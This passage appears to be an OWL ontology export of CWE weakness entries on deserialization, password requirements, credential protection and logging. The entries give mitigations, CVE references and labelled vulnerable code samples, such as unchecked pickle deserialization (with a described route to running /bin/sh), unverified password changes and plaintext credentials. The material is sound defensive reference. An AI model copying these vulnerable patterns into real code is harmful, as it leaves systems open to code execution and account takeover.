                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Perform proper forward and reverse DNS lookups to detect DNS spoofing.
Note: This is only a partial solution since it will not prevent your code from being modified on the hosting site or in transit."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Alter Execution Logic"^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Other"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
Specifically, manual static analysis is typically required to find the behavior that triggers the download of code, and to determine whether integrity-checking methods are in use.
Note: These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string
                 
                 manual_analysis  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Encrypt the code with a reliable encryption scheme before transmitting.
This will only be a partial solution, since it will not detect DNS spoofing and it will not prevent your code from being modified on the hosting site."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Strategy: Sandbox or Jail

Run the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.
OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails.
Effectiveness: Limited

Note: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."^^xsd:string
                 
                 operation  ""^^xsd:string,
     other  "Alter Execution Logic"^^xsd:string,
     other  "Execute Unauthorized Code or Commands"^^xsd:string,
     other  "Other"^^xsd:string
    
    
Individual: CWE-502_Deserialization_of_Untrusted_Data

    Annotations: 
        rdfs:comment "Background Details:
Serialization and deserialization refer to the process of taking program-internal object-related data, packaging it in a way that allows the data to be externally stored or transferred (\"serialization\"), then extracting the serialized data to reconstruct the original object (\"deserialization\")."^^xsd:string,
        rdfs:comment "It is often convenient to serialize objects for communication or to save them for later use. However, deserialized data or code can often be modified without using the provided accessor functions if it does not use cryptography to protect itself. Furthermore, any cryptography would still be client-side security -- which is a dangerous security assumption.

Data that is untrusted can not be trusted to be well-formed.

When developers place no restrictions on \"gadget chains,\" or series of instances and method invocations that can self-execute during the deserialization process (i.e., before the object is returned to the caller), it is sometimes possible for attackers to leverage them to perform unauthorized actions, like generating a shell."^^xsd:string,
        rdfs:comment "Maintenance:
The relationships between CWE-502 and CWE-915 need further exploration. CWE-915 is more narrowly scoped to object modification, and is not necessarily used for deserialization."^^xsd:string,
        rdfs:comment "Marshaling, Unmarshaling:	
Marshaling and unmarshaling are effectively synonyms for serialization and deserialization, respectively."^^xsd:string,
        rdfs:comment "Pickling, Unpickling:	
In Python, the \"pickle\" functionality is used to perform serialization and deserialization."^^xsd:string,
        rdfs:comment "The application deserializes untrusted data without sufficiently verifying that the resulting data will be valid."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Web browser allows execution of native methods via a crafted string to a JavaScript function that deserializes the string."^^xsd:string
                 
                 references  CVE-2003-0791,
     
     Annotations: rdfs:comment "Python script allows local users to execute code via pickled data."^^xsd:string
                 
                 references  CVE-2011-2520,
     
     Annotations: rdfs:comment "Content management system written in PHP allows unserialize of arbitrary objects, possibly allowing code execution."^^xsd:string, 
                 rdfs:comment "Use of PHP unserialize function on untrusted input in content management system allows code execution using a crafted cookie value."^^xsd:string
                 
                 references  CVE-2012-0911,
     
     Annotations: rdfs:comment "Use of PHP unserialize function on untrusted input in content management system might allow code execution."^^xsd:string
                 
                 references  CVE-2012-3527,
     
     Annotations: rdfs:comment "Unsafe deserialization using pickle in a Python script."^^xsd:string
                 
                 references  CVE-2012-4406,
     
     Annotations: rdfs:comment "Use of PHP unserialize function on untrusted input allows attacker to modify application configuration."^^xsd:string
                 
                 references  CVE-2013-1465,
     
     Annotations: rdfs:comment "Deserialization issue in commonly-used Java library allows remote execution."^^xsd:string
                 
                 references  CVE-2015-4852,
     
     Annotations: rdfs:comment "Deserialization issue in commonly-used Java library allows remote execution."^^xsd:string
                 
                 references  CVE-2015-8103,
     
     Annotations: rdfs:comment "Object Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-586,
     ID  "502"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified."^^xsd:string, 
                 rdfs:comment "Make fields transient to protect them from deserialization.
An attempt to serialize and then deserialize a class containing transient fields will result in NULLs where the transient data should be. This is an excellent way to prevent time, environment-based, or sensitive variables from being carried over and used improperly."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "If a function is making an assumption on when to terminate, based on a sentry in a string, it could easily never terminate."^^xsd:string
                 
                 availability  "DoS: Resource Consumption (CPU)"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This code snippet deserializes an object from a file and uses it as a UI button:

(bad code)
Example Language: Java 
try {
File file = new File(\"object.obj\");
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
javax.swing.JButton button = (javax.swing.JButton) in.readObject();
in.close();
}
This code does not attempt to verify the source or contents of the file before deserializing it. An attacker may be able to replace the intended file with a file that contains arbitrary malicious code which will be executed when the button is pressed.

To mitigate this, explicitly define final readObject() to prevent deserialization. An example of this is:

(good code)
Example Language: Java 
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException(\"Cannot be deserialized\"); }"^^xsd:string, 
                 rdfs:comment "Example 2
In Python, the Pickle library handles the serialization and deserialization processes. In this example derived from [R.502.7], the code receives and parses data, and afterwards tries to authenticate a user based on validating a token.

(bad code)
Example Language: Python 
try {
class ExampleProtocol(protocol.Protocol):
def dataReceived(self, data):

# Code that would be here would parse the incoming data
# After receiving headers, call confirmAuth() to authenticate

def confirmAuth(self, headers):
try:
token = cPickle.loads(base64.b64decode(headers['AuthToken']))
if not check_hmac(token['signature'], token['data'], getSecretKey()):
raise AuthFail
self.secure_data = token['data']
except:
raise AuthFail
}
Unfortunately, the code does not verify that the incoming data is legitimate. An attacker can construct a illegitimate, serialized object \"AuthToken\" that instantiates one of Python's subprocesses to execute arbitrary commands. For instance,the attacker could construct a pickle that leverages Python's subprocess module, which spawns new processes and includes a number of arguments for various uses. Since Pickle allows objects to define the process for how they should be unpickled, the attacker can direct the unpickle process to call Popen in the subprocess module and execute /bin/sh."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Avoid having unnecessary types or gadgets available that can be leveraged for malicious ends. This limits the potential for unintended or unauthorized types and gadgets to be leveraged by the attacker. Whitelist acceptable classes. Note: new gadgets are constantly being discovered, so this alone is not a sufficient mitigation."^^xsd:string, 
                 rdfs:comment "Explicitly define a final object() to prevent deserialization."^^xsd:string, 
                 rdfs:comment "If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified."^^xsd:string, 
                 rdfs:comment "Make fields transient to protect them from deserialization.
An attempt to serialize and then deserialize a class containing transient fields will result in NULLs where the transient data should be. This is an excellent way to prevent time, environment-based, or sensitive variables from being carried over and used improperly."^^xsd:string, 
                 rdfs:comment "When deserializing data, populate a new object rather than just deserializing. The result is that the data flows through safe input validation and that the functions are safe."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Attackers can modify unexpected objects or data that was assumed to be safe from modification."^^xsd:string
                 
                 integrity  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Attackers can modify unexpected objects or data that was assumed to be safe from modification."^^xsd:string
                 
                 integrity  "Unexpected State"^^xsd:string,
     languages  "Java"^^xsd:string,
     languages  "JavaScript"^^xsd:string,
     languages  "PHP"^^xsd:string,
     languages  "Python"^^xsd:string,
     languages  "Ruby"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "The consequences can vary widely, because it depends on which objects or methods are being deserialized, and how they are used. Making an assumption that the code in the deserialized object is valid is dangerous and can enable exploitation."^^xsd:string
                 
                 other  "Varies by Context"^^xsd:string
    
    
Individual: CWE-521_Weak_Password_Requirements

    Annotations: 
        rdfs:comment "An authentication mechanism is only as strong as its credentials. For this reason, it is important to require users to have strong passwords. Lack of password complexity significantly reduces the search space when trying to guess user's passwords, making brute-force attacks easier."^^xsd:string,
        rdfs:comment "The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     related_attack_patterns  CAPEC-112,
     related_attack_patterns  CAPEC-16,
     related_attack_patterns  CAPEC-49,
     related_attack_patterns  CAPEC-55,
     related_attack_patterns  CAPEC-70,
     ID  "521"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "An attacker could easily guess user passwords and gain access user accounts."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "Authentication mechanisms should always require sufficiently complex passwords and require that they be periodically changed."^^xsd:string, 
                 rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Enforce usage of strong passwords. A password strength policy should contain the following attributes:
1. Minimum and maximum length;
2. Require mixed character sets (alpha, numeric, special, mixed case);
3. Do not contain user name;
4. Expiration;
5. No password reuse."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-522_Insufficiently_Protected_Credentials

    Annotations: 
        rdfs:comment "This weakness occurs when the application transmits or stores authentication credentials and uses an insecure method that is susceptible to unauthorized interception and/or retrieval."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Web application password change utility doesn't check the original password."^^xsd:string
                 
                 references  CVE-2000-0944,
     
     Annotations: rdfs:comment "chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass."^^xsd:string
                 
                 references  CVE-2005-0408,
     
     Annotations: rdfs:comment "product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks."^^xsd:string
                 
                 references  CVE-2005-3435,
     
     Annotations: rdfs:comment "Web app allows remote attackers to change the passwords of arbitrary users without providing the original password, and possibly perform other unauthorized actions."^^xsd:string
                 
                 references  CVE-2007-0681,
     
     Annotations: rdfs:comment "Session Sidejacking"^^xsd:string
                 
                 related_attack_patterns  CAPEC-102,
     
     Annotations: rdfs:comment "Password Recovery Exploitation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-50,
     
     Annotations: rdfs:comment "Remote Services with Stolen Credentials"^^xsd:string
                 
                 related_attack_patterns  CAPEC-555,
     
     Annotations: rdfs:comment "Use of Captured Hashes (Pass The Hash)"^^xsd:string
                 
                 related_attack_patterns  CAPEC-644,
     
     Annotations: rdfs:comment "Use of Captured Tickets (Pass The Ticket)"^^xsd:string
                 
                 related_attack_patterns  CAPEC-645,
     ID  "522"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "An attacker could gain access to user accounts and access sensitive data used by the user accounts."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Make appropriate use of cryptography to protect the credentials."^^xsd:string, 
                 rdfs:comment "Use an appropriate security mechanism to protect the credentials."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This code changes a user's password.

(bad code)
Example Language: PHP 
$user = $_GET['user'];
$pass = $_GET['pass'];
$checkpass = $_GET['checkpass'];
if ($pass == $checkpass) {
SetUserPassword($user, $pass);
}
While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account."^^xsd:string, 
                 rdfs:comment "Example 2
The following code reads a password from a properties file and uses the password to connect to a database.

(bad code)
Example Language: Java 
...
Properties prop = new Properties();
prop.load(new FileInputStream(\"config.properties\"));
String password = prop.getProperty(\"password\");
DriverManager.getConnection(url, usr, password);
...
This code will run successfully, but anyone who has access to config.properties can read the value of password. If a devious employee has access to this information, they can use it to break into the system."^^xsd:string, 
                 rdfs:comment "Example 3
The following code reads a password from the registry and uses the password to create a new network credential.

(bad code)
Example Language: Java 
...
String password = regKey.GetValue(passKey).toString();
NetworkCredential netCred = new NetworkCredential(username,password,domain);
...
This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system"^^xsd:string, 
                 rdfs:comment "Example 4
Both of these examples verify a password by comparing it to a stored compressed version.

(bad code)
Example Language: C 
int VerifyAdmin(char *password) {
if (strcmp(compress(password), compressed_password)) {
printf(\"Incorrect Password!\\n\");
return(0);
}
printf(\"Entering Diagnostic Mode...\\n\");
return(1);
}
(bad code)
Example Language: Java 
int VerifyAdmin(String password) {
if (passwd.Equals(compress(password), compressed_password)) {
return(0);
}
//Diagnostic Mode 
return(1);
}
Because a compression algorithm is used instead of a one way hashing algorithm, an attacker can recover compressed passwords stored in the database."^^xsd:string, 
                 rdfs:comment "Example 5
The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in plaintext.

This Java example shows a properties file with a plaintext username / password pair.

(bad code)
Example Language: Java 

# Java Web App ResourceBundle properties file 
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...
The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in plaintext.

(bad code)
Example Language: ASP.NET 
...
<connectionStrings>
<add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" />
</connectionStrings>
...
Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information and avoid CWE-260 and CWE-13."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Use industry standards to protect the credentials (e.g. LDAP, keystore, etc.)."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-523_Unprotected_Transport_of_Credentials

    Annotations: 
        rdfs:comment "Background Details:
SSL (Secure Socket Layer) provides data confidentiality and integrity to HTTP. By encrypting HTTP messages, SSL protects from attackers eavesdropping or altering message contents."^^xsd:string,
        rdfs:comment "Login pages not using adequate measures to protect the user name and password while they are in transit from the client to the server."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Session Sidejacking"^^xsd:string
                 
                 related_attack_patterns  CAPEC-102,
     ID  "523"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Enforce SSL use for the login page or any page used to transmit user credentials or other sensitive information. Even if the entire site does not use SSL, it MUST use SSL for login. Additionally, to help prevent phishing attacks, make sure that SSL serves the login page. SSL allows the user to verify the identity of the server to which they are connecting. If the SSL serves login page, the user can be certain they are talking to the proper end system. A phishing attack would typically redirect a user to a site that does not have a valid trusted server certificate issued from an authorized supplier."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Enforce SSL use for the login page or any page used to transmit user credentials or other sensitive information. Even if the entire site does not use SSL, it MUST use SSL for login. Additionally, to help prevent phishing attacks, make sure that SSL serves the login page. SSL allows the user to verify the identity of the server to which they are connecting. If the SSL serves login page, the user can be certain they are talking to the proper end system. A phishing attack would typically redirect a user to a site that does not have a valid trusted server certificate issued from an authorized supplier."^^xsd:string
                 
                 system_configuration  ""^^xsd:string
    
    
Individual: CWE-527_Exposure_of_CVS_Repository_to_an_Unauthorized_Control_Sphere

    Annotations: 
        rdfs:comment "Information contained within a CVS subdirectory on a web server or other server could be recovered by an attacker and used for malicious purposes. This information may include usernames, filenames, path root, and IP addresses."^^xsd:string,
        rdfs:comment "The product stores a CVS repository in a directory or other container that is accessible to actors outside of the intended control sphere."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "527"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Recommendations include removing any CVS directories and repositories from the production server, disabling the use of remote CVS repositories, and ensuring that the latest CVS patches and version updates have been performed."^^xsd:string
                 
                 distribution  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "Recommendations include removing any CVS directories and repositories from the production server, disabling the use of remote CVS repositories, and ensuring that the latest CVS patches and version updates have been performed."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Recommendations include removing any CVS directories and repositories from the production server, disabling the use of remote CVS repositories, and ensuring that the latest CVS patches and version updates have been performed."^^xsd:string
                 
                 system_configuration  ""^^xsd:string
    
    
Individual: CWE-528_Exposure_of_Core_Dump_File_to_an_Unauthorized_Control_Sphere

    Annotations: 
        rdfs:comment "The product generates a core dump file in a directory that is accessible to actors outside of the intended control sphere."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "528"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Protect the core dump files from unauthorized access."^^xsd:string
                 
                 system_configuration  ""^^xsd:string
    
    
Individual: CWE-529_Exposure_of_Access_Control_List_Files_to_an_Unauthorized_Control_Sphere

    Annotations: 
        rdfs:comment "Exposure of these access control list files may give the attacker information about the configuration of the site or system. This information may then be used to bypass the intended security policy or identify trusted systems from which an attack can be launched."^^xsd:string,
        rdfs:comment "The product stores access control list files in a directory or other container that is accessible to actors outside of the intended control sphere."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "529"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Bypass Protection Mechanism"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Protect access control list files."^^xsd:string
                 
                 system_configuration  ""^^xsd:string
    
    
Individual: CWE-530_Exposure_of_Backup_File_to_an_Unauthorized_Control_Sphere

    Annotations: 
        rdfs:comment "A backup file is stored in a directory that is accessible to actors outside of the intended control sphere."^^xsd:string,
        rdfs:comment "Often, old files are renamed with an extension such as .~bk to distinguish them from production files. The source code for old files that have been renamed in this manner and left in the webroot can often be retrieved. This renaming may have been performed automatically by the web server, or manually by the administrator."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "530"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "At a minimum, an attacker who retrieves this file would have all the information contained in it, whether that be database calls, the format of parameters accepted by the application, or simply information regarding the architectural structure of your site."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Recommendations include implementing a security policy within your organization that prohibits backing up web application source code in the webroot."^^xsd:string
                 
                 policy  ""^^xsd:string
    
    
Individual: CWE-532_Information_Exposure_Through_Log_Files

    Annotations: 
        rdfs:comment "Information written to log files can be of a sensitive nature and give valuable guidance to an attacker or expose sensitive user information."^^xsd:string,
        rdfs:comment "While logging all information may be helpful during development stages, it is important that logging levels be set appropriately before a product ships so that sensitive user data and system information are not accidentally exposed to potential attackers.
Different log files may be produced and stored for:
-Server log files (e.g. server.log). This can give information on whatever application left the file. Usually this can give full path names and system information, and sometimes usernames and passwords.
-log files that are used for debugging."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1009_Audit,
     
     Annotations: rdfs:comment "An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. By observing logs and error messages, the attacker can learn details about the configuration of the target application and might be able to cause the target to disclose sensitive information."^^xsd:string
                 
                 related_attack_patterns  CAPEC-215,
     ID  "532"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Consider seriously the sensitivity of the information written into log files. Do not write secrets into the log files."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "Logging sensitive user data often provides attackers with an additional, less-protected path to acquiring the information."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "In the following code snippet, a user's full name and credit card number are written to a log file.

Example Language: Java  /*(bad code)*/

logger.info(\"Username: \" + usernme + \", CCN: \" + ccn);"^^xsd:string
                 
                 demonstrative_examples  "Example 1"^^xsd:string,
     
     Annotations: rdfs:comment "This code stores location information about the current user:

Example Language: Java  /*(bad code)*/ 
locationClient = new LocationClient(this, this, this);
locationClient.connect();
currentUser.setLocation(locationClient.getLastLocation());
... 

catch (Exception e) {
AlertDialog.Builder builder = new AlertDialog.Builder(this);
builder.setMessage(\"Sorry, this application has experienced an error.\");
AlertDialog alert = builder.create();
alert.show();
Log.e(\"ExampleActivity\", \"Caught exception: \" + e + \" While on User:\" + User.toString());
}
When the application encounters an exception it will write the user object to the log. Because the user object contains location information, the user's location is also written to the log."^^xsd:string
                 
                 demonstrative_examples  "Example 2"^^xsd:string,
     
     Annotations: rdfs:comment "Remove debug log files before deploying the application into production."^^xsd:string
                 
                 distribution  ""^^xsd:string,
     
     Annotations: rdfs:comment "Adjust configurations appropriately when software is transitioned from a debug state to production."^^xsd:string, 
                 rdfs:comment "Consider seriously the sensitivity of the information written into log files. Do not write secrets into the log files."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
